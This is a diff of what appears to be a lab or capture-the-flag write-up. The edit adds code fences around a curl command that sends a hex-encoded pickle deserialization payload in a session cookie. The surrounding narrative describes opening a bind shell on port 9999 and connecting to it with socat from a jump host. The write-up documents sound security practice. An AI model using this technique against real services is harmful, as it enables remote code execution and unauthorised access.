@@ -175,9 +175,9 @@ print(pickle.dumps(RCE()).hex())
     Execution: We sent the generated hex string via a GET request using curl from our compromised jump-host container:
 
 Bash
-
+```
 curl -i -X GET -H "Cookie: session_data=<PAYLOAD_HEX>" http://localhost:8888/
-
+```
 8. Initial Access & User Flag
 
 The payload successfully opened port 9999 on the target container (192.168.100.12). Since the target Docker image was stripped down and lacked nc (netcat), we used socat from our jump-host container to connect to the bind shell.
